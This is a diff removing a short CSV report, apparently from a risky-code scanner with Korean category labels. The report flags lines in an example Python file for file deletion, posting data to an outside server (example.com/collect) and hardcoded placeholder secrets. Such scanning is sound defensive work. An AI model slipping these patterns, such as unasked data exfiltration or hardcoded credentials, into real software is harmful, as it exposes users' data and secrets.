@@ -1,6 +1,0 @@
-file,line,category,description,matched_code
-example_risky_code.py,13,파일 삭제,파일이나 디렉토리를 삭제하는 코드,"os.remove(os.path.join(folder, f))"
-example_risky_code.py,19,파일 삭제,파일이나 디렉토리를 삭제하는 코드,"shutil.rmtree(""/tmp/my_temp_folder"")"
-example_risky_code.py,16,외부 전송,외부 서버로 데이터를 보내는 코드,"requests.post(""https://example.com/collect"", json=data)"
-example_risky_code.py,8,비밀키 하드코딩,비밀번호나 API 키가 코드에 직접 쓰여 있는 경우,"API_KEY = ""sk-fake-1234567890abcdef"""
-example_risky_code.py,9,비밀키 하드코딩,비밀번호나 API 키가 코드에 직접 쓰여 있는 경우,"PASSWORD = ""my_super_secret_password_123"""
